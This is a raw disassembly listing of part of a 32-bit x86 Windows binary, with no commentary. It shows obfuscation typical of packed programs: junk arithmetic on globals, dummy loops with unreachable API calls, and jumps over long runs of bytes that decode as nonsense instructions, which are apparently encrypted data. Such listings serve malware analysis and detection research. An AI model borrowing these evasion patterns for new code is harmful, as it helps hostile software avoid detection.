  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41abda,0x417e49
  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412398
  409412:	mov    esi,DWORD PTR ds:0x421896
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
  409420:	mov    esi,DWORD PTR [ebp+0x10]
  409423:	mov    DWORD PTR [esi+0x8],eax
  409426:	mov    DWORD PTR ds:0x412368,0x19
  409430:	cmp    DWORD PTR ds:0x412368,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x412368,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x412368
  40945a:	dec    eax
  40945b:	mov    ds:0x412368,eax
  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0x39b4f7ee
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	xor    DWORD PTR [esi+edi*2+0x31],edi
  409492:	call   0xf952:0xf3991eca
  409499:	aam    0xfb
  40949b:	sub    bh,bl
  40949d:	or     ebp,ebx
  40949f:	jmp    0x4e3a:0xf7ef8bf8
  4094a6:	lds    esp,FWORD PTR [esi-0x1366cbf9]
  4094ac:	add    ebp,ecx
  4094ae:	leave  
  4094af:	in     al,0x77
  4094b1:	lahf   
  4094b2:	cmp    DWORD PTR [edx+0x3019838a],0xfffffff6
  4094b9:	out    dx,eax
  4094ba:	mov    WORD PTR [eax-0x4b151828],?
  4094c0:	in     al,dx
  4094c1:	les    esp,FWORD PTR [edx+0x7e1190f3]
  4094c7:	push   es
  4094c8:	std    
  4094c9:	sub    ebp,DWORD PTR [edx]
  4094cb:	push   ebx
  4094cc:	xchg   ecx,eax
  4094cd:	pop    ebp
  4094ce:	or     DWORD PTR [ebp+0x7828d26b],esi
  4094d4:	out    0xc1,eax
  4094d6:	fadd   QWORD PTR ds:0x3441db55
  4094dc:	xor    eax,0x92dcc25c
  4094e1:	imul   edx,DWORD PTR [edi-0x65],0x6d8d7caf
  4094e8:	add    al,0xd8
  4094ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094eb:	add    eax,0xd0396a6b
  4094f0:	js     0x40947b
  4094f2:	push   ecx
  4094f3:	and    DWORD PTR [esi-0x3b9b7e15],0xffffffa6
  4094fa:	daa    
  4094fb:	and    cl,BYTE PTR [ebx]
  4094fd:	stos   BYTE PTR es:[edi],al
  4094fe:	push   0x77c76415
  409503:	push   esi
  409504:	scas   eax,DWORD PTR es:[edi]
  409505:	cmc    
  409506:	or     eax,0xbaef3e5f
  40950b:	adc    eax,0xc9c8c424
  409510:	jnp    0x4094cc
  409512:	gs (bad) 
  409514:	mov    esp,0x23ba8167
  409519:	adc    DWORD PTR [eax],esi
  40951b:	adc    al,0x1
  40951d:	xor    DWORD PTR [edi-0x74c1a517],0x75
  409524:	adc    BYTE PTR [ecx-0x3f74efba],cl
  40952a:	mov    eax,DWORD PTR [ebp+0x8]
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    bh,BYTE PTR [edx+0x9cbcb5a]
  409543:	and    DWORD PTR [esi+0x7e],edi
  409546:	cmp    BYTE PTR [esi+0x7e],0x7e
  40954a:	inc    ebx
  40954b:	inc    ebp
  40954c:	fsub   QWORD PTR [esi+ebx*2-0x7c]
  409550:	mov    BYTE PTR [ebx+0x33cb6520],ch
  409556:	test   esp,esp
  409558:	js     0x4094e9
  40955a:	dec    BYTE PTR [edx]
  40955c:	out    dx,eax
  40955d:	stos   DWORD PTR es:[edi],eax
  40955e:	(bad)  
  40955f:	stos   DWORD PTR es:[edi],eax
  409560:	xchg   ebx,eax
  409561:	daa    
  409562:	fadd   QWORD PTR [edi+0x3b142fa4]
  409568:	out    dx,al
  409569:	pop    ebp
  40956a:	lea    ebx,[edx-0x6414e186]
  409570:	mov    sp,0xaf83
  409574:	push   0xbc1c95a5
  409579:	fdiv   st(5),st
  40957b:	mov    al,cs:0x3e555a47
  409581:	repz out 0xac,eax
  409584:	fwait
  409585:	mov    edi,0x8af3b214
  40958a:	out    0xbd,al
  40958c:	fdivr  DWORD PTR [eax-0x40]
  40958f:	ror    BYTE PTR [ebx-0x3a],0x46
  409593:	xor    cl,cl
  409595:	mov    BYTE PTR [ebx+ebx*8],ah
  409598:	sub    DWORD PTR [ebx+0x15],eax
  40959b:	cmp    eax,0x83e94591
  4095a0:	call   0xaf92f4f6
  4095a5:	add    DWORD PTR [edx+0x3e4fd300],esp
  4095ab:	shl    DWORD PTR [ebx],0x1d
  4095ae:	bound  esi,QWORD PTR [ecx+edi*1+0x4b406569]
  4095b5:	pop    ds
  4095b6:	test   eax,0xaa94e723
  4095bb:	adc    dh,al
  4095bd:	cld    
  4095be:	cs in  al,dx
  4095c0:	(bad)  
  4095c1:	pop    ebx
  4095c2:	mov    al,0xf1
  4095c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095c5:	rol    dh,cl
  4095c7:	es stos BYTE PTR es:[edi],al
  4095c9:	add    edx,DWORD PTR [ecx+esi*8-0x78844ca]
  4095d0:	sbb    BYTE PTR fs:[ebx*8-0x3ba0afb6],dl
  4095d8:	or     BYTE PTR [esi+0x1e6df4d4],ch
  4095de:	xor    eax,ecx
  4095e0:	add    eax,edx
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    edi,DWORD PTR [esi+edi*4]
  40961d:	xchg   edx,eax
  40961e:	xchg   DWORD PTR [ebp+0x167e7e21],ebx
  409624:	jg     0x4096a4
  409626:	jle    0x4095cb
  409628:	js     0x409641
  40962a:	or     ecx,DWORD PTR [edx+0x1e]
  40962d:	cmc    
  40962e:	inc    ebp
  40962f:	icebp  
  409630:	mov    BYTE PTR [edx+0x24],bl
  409633:	pop    esi
  409634:	int    0xc5
  409636:	(bad)  
  409637:	or     ebx,DWORD PTR [edx+0x14]
  40963a:	cli    
  40963b:	aaa    
  40963c:	and    BYTE PTR [edx-0x51],bl
  40963f:	add    bl,BYTE PTR [edx]
  409641:	pushf  
  409642:	jg     0x4096bc
  409644:	dec    edi
  409645:	scas   al,BYTE PTR es:[edi]
  409646:	lods   al,BYTE PTR ds:[esi]
  409647:	mov    edx,DWORD PTR [ebp+0x44]
  40964a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40964b:	pushf  
  40964c:	out    0x43,al
  40964e:	in     eax,0x1b
  409650:	add    eax,0x5a1e7656
  409655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409656:	ss (bad) 
  409658:	inc    ecx
  409659:	xchg   ebp,eax
  40965a:	or     al,0x4b
  40965c:	push   0xffffff99
  40965e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40965f:	mov    eax,DWORD PTR [eax]
  409661:	mov    al,ds:0x76fa780c
  409666:	adc    BYTE PTR [esi],al
  409668:	push   DWORD PTR [ecx-0x6f]
  40966b:	daa    
  40966c:	cmp    bh,BYTE PTR [edi]
  40966e:	lahf   
  40966f:	cmp    al,0x85
  409671:	aam    0x82
  409673:	jp     0x4096d0
  409675:	lock mov al,0xab
  409678:	pop    es
  409679:	add    DWORD PTR [ebx+0x1778a7e4],ebx
  40967f:	and    BYTE PTR [edi-0xa30819b],al
  409685:	int    0x47
  409687:	in     al,dx
  409688:	ret    0xa0b7
  40968b:	cmp    eax,0xdf5d0741
  409690:	mov    edi,0xfd6aac20
  409695:	push   esi
  409696:	shl    DWORD PTR [edx],cl
  409698:	pop    ss
  409699:	shl    dl,0x3f
  40969c:	ret    
  40969d:	push   ds
  40969e:	add    dh,0x16
  4096a1:	repnz inc edi
  4096a3:	inc    edi
  4096a4:	mov    esi,0xa1bc3219
  4096a9:	cdq    
  4096aa:	jl     0x409666
  4096ac:	cs push ebx
  4096ae:	jnp    0x409644
  4096b0:	mov    DWORD PTR [edx-0x73],ecx
  4096b3:	nop
  4096b4:	add    DWORD PTR [edi+0x7ff218cd],edi
  4096ba:	xchg   BYTE PTR [ecx-0x10],dh
  4096bd:	xlat   BYTE PTR ds:[ebx]
  4096be:	xchg   edx,eax
  4096bf:	mov    DWORD PTR ds:0x4e2a281a,ecx
  4096c5:	push   edi
  4096c6:	bswap  eax
  4096c8:	call   0xb2f79f1d
  4096cd:	call   0x7d75:0x907f5d25
  4096d4:	dec    ebp
  4096d5:	out    0xe5,eax
  4096d7:	repnz mov dl,0xcb
  4096da:	ret    0x1386
  4096dd:	jl     0x40968c
  4096df:	push   eax
  4096e0:	mov    ebx,0x465e89f5
  4096e5:	test   al,0x45
  4096e7:	pushf  
  4096e8:	mov    al,0x6
  4096ea:	repnz inc ebx
  4096ec:	mov    ebx,0xda4a994e
  4096f1:	(bad)  
  4096f3:	or     eax,0x2b1daa88
  4096f8:	(bad)  
  4096f9:	jecxz  0x4096ec
  4096fb:	xor    edi,esp
  4096fd:	or     bl,BYTE PTR [esp+edi*8-0x6fb84021]
  409704:	dec    ebx
  409705:	jge    0x409698
  409707:	sub    eax,0xebc0f03f
  40970c:	xchg   ecx,eax
  40970d:	hlt    
  40970e:	add    DWORD PTR [edi+0x40],0x1e0d23c0
  409715:	inc    ecx
  409716:	mov    cl,0x7a
  409718:	stos   BYTE PTR es:[edi],al
  409719:	cmp    BYTE PTR [eax],ch
  40971b:	repz dec ebx
  40971d:	cmp    eax,DWORD PTR [ebp+0x68591fa0]
  409723:	dec    ecx
  409724:	jmp    0x40971d
  409726:	mov    bl,0x17
  409728:	pop    edx
  409729:	addr16 push esp
  40972b:	aam    0x88
  40972d:	pop    ebx
  40972e:	call   0xaf6e:0xcd31590e
  409735:	mov    esp,0xfc49a181
  40973a:	jmp    0x12ea:0x77446654
  409741:	xchg   esp,eax
  409742:	mul    DWORD PTR [esi-0x3822ec26]
  409748:	mov    WORD PTR [esi],ds
  40974a:	mov    ebx,0x301b7ee4
  40974f:	push   ecx
  409750:	sbb    edx,eax
  409752:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409759:	or     DWORD PTR ds:0x4245ae,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412370,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41abd6
  409776:	adc    DWORD PTR ds:0x4245ca,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417e59,0x412370
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x41235c,0x41abd2
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415115,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4245ba
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	xchg   esi,eax
  4097c0:	sbb    DWORD PTR [edx+0x3b],edx
  4097c3:	mov    ch,0x26
  4097c5:	jle    0x409845
  4097c7:	push   ss
  4097c8:	jg     0x409848
  4097ca:	jle    0x4097b0
  4097cc:	push   cs
  4097cd:	sub    BYTE PTR [edx-0x5ae81947],bh
  4097d3:	cmc    
  4097d4:	xor    al,0xa5
  4097d6:	lods   eax,DWORD PTR ds:[esi]
  4097d7:	dec    esp
  4097d8:	sub    ah,BYTE PTR [ebx]
  4097da:	pusha  
  4097db:	xchg   edi,eax
  4097dc:	dec    ebx
  4097dd:	je     0x4097d4
  4097df:	jbe    0x4097ef
  4097e1:	bound  edx,QWORD PTR [ebp+0x21408047]
  4097e7:	and    dh,dh
  4097e9:	fstp   DWORD PTR [esi-0x71010d9f]
  4097ef:	pop    ss
  4097f0:	or     al,0x53
  4097f2:	in     eax,0xc
  4097f4:	pop    edx
  4097f5:	in     eax,0x84
  4097f7:	adc    al,0x4
  4097f9:	arpl   WORD PTR ds:0x6cf9d617,si
  4097ff:	shr    BYTE PTR [ebp+0x1a],1
  409802:	dec    ebp
  409803:	das    
  409804:	je     0x4097ac
  409806:	fnstcw WORD PTR [eax]
  409808:	jb     0x409888
  40980a:	cmp    al,0xc8
  40980c:	push   esi
  40980d:	inc    ecx
  40980e:	(bad)  
  40980f:	lods   al,BYTE PTR ds:[esi]
  409810:	add    BYTE PTR [ebx+0x24],dl
  409813:	loop   0x4097d4
  409815:	aad    0x60
  409817:	push   esi
  409818:	(bad)  
  409819:	mov    esp,0x9de56347
  40981e:	repz or DWORD PTR [ebx+0x61287134],ecx
  409825:	xor    dh,al
  409827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409828:	mov    ah,0x1f
  40982a:	push   ebp
  40982b:	dec    ebp
  40982c:	das    
  40982d:	in     al,dx
  40982e:	mov    esi,ebx
  409830:	cs cdq 
  409832:	inc    esp
  409833:	in     al,dx
  409834:	xchg   edi,eax
  409835:	jmp    0x1492eadb
  40983a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40983b:	mov    bh,0xfd
  40983d:	loop   0x40983a
  40983f:	xchg   edi,eax
  409840:	or     DWORD PTR [esi],ebp
  409842:	loopne 0x4097e8
  409844:	adc    BYTE PTR [edi],dl
  409846:	mov    al,ds:0x55f6f2d3
  40984b:	mov    bl,0x69
  40984d:	hlt    
  40984e:	out    0x8d,eax
  409850:	cmp    al,0x1e
  409852:	jnp    0x4098bd
  409854:	in     al,dx
  409855:	sbb    DWORD PTR [ebx+0x5889547f],eax
  40985b:	mov    eax,0x30781da1
  409860:	pop    edx
  409861:	cs jo  0x409819
  409864:	aam    0x68
  409866:	push   ds
  409867:	std    
  409868:	push   esi
  409869:	and    ch,BYTE PTR [ebp+0x2a]
  40986c:	jp     0x40987e
  40986e:	mov    ecx,0xf02c796a
  409873:	push   edi
  409874:	mov    edx,0x5b04cc96
  409879:	(bad)  
  40987a:	outs   dx,DWORD PTR ds:[esi]
  40987b:	jo     0x4098f1
  40987d:	or     esi,DWORD PTR ds:[ebx+ebp*1+0x70]
  409882:	mov    al,ds:0xa6b66139
  409887:	sbb    dl,bh
  409889:	push   esp
  40988a:	ds xchg ebp,eax
  40988c:	loope  0x4098b1
  40988e:	pop    ss
  40988f:	not    DWORD PTR [esp+ebp*4-0x537a4fc9]
  409896:	dec    edx
  409897:	clc    
  409898:	lock and ebp,DWORD PTR [ebx-0x77d53529]
  40989f:	retf   
  4098a0:	lds    esi,FWORD PTR [ebx-0x563638ef]
  4098a6:	call   0x851f:0xa9afe490
  4098ad:	retf   0xd5fe
  4098b0:	cmp    eax,0x4305f198
  4098b5:	not    DWORD PTR [ebx+0xd81c5c9]
  4098bb:	inc    ebx
  4098bc:	xor    dl,BYTE PTR [edx-0x158270dc]
  4098c2:	ret    0xd20f
  4098c5:	xor    DWORD PTR [edi+0x56bed3d1],esi
  4098cb:	and    BYTE PTR [edx-0x7b742db4],bl
  4098d1:	scas   eax,DWORD PTR es:[edi]
  4098d2:	repz adc DWORD PTR [edx-0x5a],0x6deeb0f6
  4098da:	mov    es,WORD PTR [ebx+ecx*2]
  4098dd:	out    dx,eax
  4098de:	ins    BYTE PTR es:[edi],dx
  4098df:	(bad)  
  4098e0:	repz fcom QWORD PTR [ecx]
  4098e3:	out    dx,eax
  4098e4:	jnp    0x409913
  4098e6:	(bad)
  4098e9:	outs   dx,BYTE PTR ds:[esi]
  4098ea:	and    BYTE PTR [edi-0xa0248c2],0x59
  4098f1:	fimul  DWORD PTR gs:[ebx+0x25811445]
  4098f8:	and    eax,DWORD PTR fs:[ecx+0x0]
  4098fc:	add    BYTE PTR [eax],al
  4098fe:	add    BYTE PTR [eax],al
  409900:	mov    edx,DWORD PTR ds:0x412364
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x412364,edx
  40990d:	cmp    DWORD PTR ds:0x412364,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x412364,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x412364
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x412364,edx
  40994a:	cmp    DWORD PTR ds:0x412364,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0x380f7b4c
  409977:	stc    
  409978:	ins    DWORD PTR es:[edi],dx
  409979:	daa    
  40997a:	jle    0x4099fa
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x409972
  409981:	jl     0x4099e5
  409983:	jg     0x409960
  409985:	repz pop esi
  409987:	fisub  DWORD PTR [edx]
  409989:	aas    
  40998a:	inc    eax
  40998b:	jg     0x409976
  40998d:	call   0xd030:0x6e05268
  409994:	data16 gs cli 
  409997:	pusha  
  409998:	enter  0xbada,0xc1
  40999c:	aaa    
  40999d:	stos   BYTE PTR es:[edi],al
  40999e:	fld    DWORD PTR [edi-0x3b]
  4099a1:	je     0x409a18
  4099a3:	inc    ebx
  4099a4:	pusha  
  4099a5:	push   ebp
  4099a6:	in     al,dx
  4099a7:	and    ebx,eax
  4099a9:	xchg   ebp,eax
  4099aa:	out    dx,al
  4099ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099ac:	rcr    DWORD PTR [edx],cl
  4099ae:	cmp    DWORD PTR [eax+eiz*4],eax
  4099b1:	mov    ebp,0xcf901d2
  4099b6:	and    ecx,esi
  4099b8:	stos   BYTE PTR es:[edi],al
  4099b9:	sub    esp,DWORD PTR [ecx]
  4099bb:	or     BYTE PTR [esi-0x34b0df6a],0xb8
  4099c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099c3:	jmp    0x29392538
  4099c8:	jmp    0x7cde:0x8b834e4d
  4099cf:	fld    TBYTE PTR [ebx+eax*1-0x7967fd80]
  4099d6:	push   ds
  4099d7:	fnsave [ebx+0x54]
  4099da:	and    al,0x8b
  4099dc:	fbld   TBYTE PTR [edx-0x42e76c97]
  4099e2:	dec    ebx
  4099e3:	popf   
  4099e4:	ds push es
  4099e6:	mov    eax,ds:0xe41f1b96
  4099eb:	arpl   WORD PTR [esi+edx*1+0x57da26ac],bp
  4099f2:	adc    bh,BYTE PTR [eax-0x78]
  4099f5:	cli    
  4099f6:	ret    0x93f6
  4099f9:	push   es
  4099fa:	xchg   BYTE PTR [edx],dh
  4099fc:	ror    BYTE PTR [ebx+0x47b5e45],cl
  409a02:	inc    edx
  409a03:	push   edx
  409a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a05:	aam    0x16
  409a07:	xor    ecx,eax
  409a09:	jp     0x409a70
  409a0b:	pop    ss
  409a0c:	mov    edx,DWORD PTR ds:0x5a72432d
  409a12:	cmp    al,0xd1
  409a14:	sar    BYTE PTR ds:[ebx*1+0x3dc8c4d1],1
  409a1c:	and    BYTE PTR [ebp-0x80],bh
  409a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a20:	cmp    cl,ch
  409a22:	repnz fdiv QWORD PTR [edi]
  409a25:	enter  0xdc2e,0x61
  409a29:	sbb    BYTE PTR [edx-0x64],0xb6
  409a2d:	fs loope 0x4099f1
  409a30:	psrad  mm0,QWORD PTR [eax-0x49]
  409a34:	mov    ?,WORD PTR [ebp+ecx*1+0xb67ab4b]
  409a3b:	std    
  409a3c:	xchg   BYTE PTR [edi+esi*4+0x14],ch
  409a40:	xchg   esp,esp
  409a42:	and    BYTE PTR [edi+0x7d7769e2],cl
  409a48:	loop   0x409ac7
  409a4a:	inc    ebp
  409a4b:	test   bl,bh
  409a4d:	add    BYTE PTR [ebx+0x2f62cd76],al
  409a53:	rol    DWORD PTR [eax-0x4d698129],cl
  409a59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a5a:	fcomp  QWORD PTR [edx-0x3b]
  409a5d:	ins    DWORD PTR es:[edi],dx
  409a5e:	test   BYTE PTR [eax],dl
  409a60:	xchg   DWORD PTR [ebx+0x43231a86],edi
  409a66:	pop    edx
  409a67:	(bad)  
  409a68:	shl    BYTE PTR [edi+0x714487c7],1
  409a6e:	test   BYTE PTR [ebx+0x75],bh
  409a71:	loop   0x409a01
  409a73:	push   cs
  409a74:	imul   eax,DWORD PTR [edx+eiz*8-0x13],0x2b14ff5f
  409a7c:	jmp    0xeeb1:0xe75ecb8b
  409a83:	fs js  0x409a6e
  409a86:	mov    al,0xd5
  409a88:	adc    BYTE PTR [ebx],0x96
  409a8b:	jecxz  0x409a32
  409a8d:	int    0xfa
  409a8f:	sub    eax,DWORD PTR [ebp-0x5f]
  409a92:	dec    cl
  409a94:	mov    al,ds:0xa0728877
  409a99:	xor    ecx,ecx
  409a9b:	pop    DWORD PTR [ebx]
  409a9d:	push   ds
  409a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a9f:	sbb    DWORD PTR [edi+ebx*1-0x3b],ebx
  409aa3:	icebp  
  409aa4:	cmp    eax,DWORD PTR [ecx]
  409aa6:	xchg   ebx,eax
  409aa7:	bound  ecx,QWORD PTR [ecx+0x458b0842]
  409aad:	sbb    al,0x8b
  409aaf:	push   ebp
  409ab0:	adc    BYTE PTR [ecx+0x458b0c42],cl
  409ab6:	and    BYTE PTR [ebx+0x42891055],cl
  409abc:	adc    BYTE PTR [ebx+0x14458bc0],cl
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417e4d,0x412378
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4245b6
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415111,0x412368
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415115,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412378,0x417e41
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4245c2,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415119,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412378,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415101,0x415109
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4245c2,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417e41
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x412354,0x4245b2
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x412354,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41abda
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4245c2,0x417e4d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41abca,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41abca
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41abca,ecx
  409bf0:	cmp    DWORD PTR ds:0x41abca,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41abca,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412370,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412370,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412370,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41abe2
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412370
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412370,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4245b2,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415119,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x412364,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41510d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41abda,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415105,0x41abe2
  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412374,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415101,0x11
  409cf2:	cmp    DWORD PTR ds:0x415101,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415101,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415101,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415101
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415101,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415101
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415101,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41abd6,0x12
  409d50:	cmp    DWORD PTR ds:0x41abd6,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41abd6,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41ad52
  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41abd6,0x4
  409d7c:	jne    0x409d8f
  409d82:	mov    edx,DWORD PTR ds:0x41abd6
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41abd6,edx
  409d8f:	mov    edx,DWORD PTR ds:0x41abd6
  409d95:	dec    edx
  409d96:	mov    DWORD PTR ds:0x41abd6,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
